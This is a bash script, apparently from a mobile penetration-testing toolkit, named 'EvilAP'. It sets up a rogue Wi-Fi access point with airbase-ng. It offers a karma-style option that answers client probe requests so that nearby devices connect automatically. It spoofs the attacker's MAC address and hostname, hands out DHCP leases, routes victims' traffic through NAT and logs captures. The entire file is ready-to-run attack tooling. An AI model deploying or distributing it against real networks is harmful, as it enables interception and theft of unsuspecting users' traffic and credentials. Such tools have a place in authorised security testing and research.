#!/bin/bash
# Desc: EvilAP script to forcefully connect wireless clients

all_wifi=0
include_monitor=0
cell_enabled=1
. px_interface_selector.sh

trap f_endclean INT
trap f_endclean KILL

f_endclean(){
  echo
  echo "[-] Exiting..."
  f_restore_ident
  f_clean_up
  ifconfig wlan1 down &> /dev/null
}

f_clean_up(){
  echo "[-] Killing other instances of airbase or dhcpd"
  killall airbase-ng &> /dev/null
  killall dhcpd &> /dev/null
  hardw=`/system/bin/getprop ro.hardware`
  if [[ "$hardw" == "deb" || "$hardw" == "flo" ]]; then
    PHY=$(cat /sys/class/net/wlan1mon/phy80211/name)
    iw dev wlan1mon del
    iw phy $PHY interface add wlan1 type station
  else
    airmon-ng stop wlan1mon &> /dev/null
  fi
  iptables --flush
  iptables --table nat --flush
}

f_restore_ident(){
  echo "[+] Restoring network identity"
  hostn=`cat /etc/hostname`
  ifconfig wlan1 down &> /dev/null
  macchanger -p wlan1 &> /dev/null
  hostname $hostn
}

f_banner(){
  clear
  echo "[+] Welcome to EvilAP"
  echo
}

f_ssid(){
  clear
  echo
  echo "[+] Enter an SSID name"
  echo "[-] Default SSID: [Public_Wireless]"
  echo
  read -p "SSID: " ssid
  echo

  if [ -z $ssid ]; then
    ssid=Public_Wireless
  fi
}

f_channel(){
  clear
  echo
  echo "[+] Enter the channel to run EvilAP on [1-14]"
  echo "[-] Default channel: [1]"
  echo
  read -p "Channel: " channel
  echo
  case $channel in
    [1-14]*) ;;
    *) channel=1 ;;
  esac
}

f_beacon_rate(){
  clear
  echo
  echo "[+] Enter the beacon rate at which to broadcast probe requests:"
  echo
  echo "[!] If clients don't stay connected try changing this value"
  echo
  echo "[-] Default is: [30]"
  echo
  read -p "Range [20-70]: " brate
  echo

  if [ -z $brate ]; then
    brate=30
  fi
}

f_preplaunch(){
  #Change the hostname and mac address randomly

  echo "[+] Rolling MAC address and hostname randomly"
  echo

  ifconfig wlan1 down
  macchanger -r wlan1

  hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
  hostname $hn
  echo "[+] New hostname set: $hn"

  sleep 2
  #Put wlan1 into monitor mode - wlan1mon created
  airmon-ng start wlan1
  mkdir /dev/net/ &> /dev/null
  ln -s /dev/tun /dev/net/tun &> /dev/null
}

f_logname(){
  echo "/opt/pwnix/captures/wireless/evilap-$(date +%s).log"
}

f_evilap(){
  #Log path and name
  logname=$(f_logname)
  echo "[+] Creating new logfile: $logname"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -P -C $brate -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_niceap(){
  #Log path and name
  logname=$(f_logname)
  echo "[+] Creating new logfile: $logname"

  #Start Airbase-ng with -P for preferred networks
  airbase-ng -c $channel -e "$ssid" -v wlan1mon > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  tail -f $logname
}

f_karmaornot(){
  clear
  echo
  echo "[?] Force clients to connect with their probe requests?"
  echo
  echo "[!] Everything will start connecting to you if YES is selected!"
  echo
  echo "1. Yes"
  echo "2. No"
  echo
  read -p "Choice [1-2]: " karma
  echo
  echo
  case $karma in
    [1-2]*) ;;
    *) f_karmaornot ;;
  esac

  if [ $karma -eq 1 ]; then
    f_beacon_rate
  fi

}

f_identify_device
f_clean_up
f_banner
f_interface
f_ssid
f_channel
f_karmaornot
f_preplaunch

if [ $karma -eq 1 ]; then
  echo "[+] Starting EvilAP with forced connection attack"
  f_evilap
else
  echo "[+] Starting EvilAP without forced connection attack"
  f_niceap
fi

f_endclean

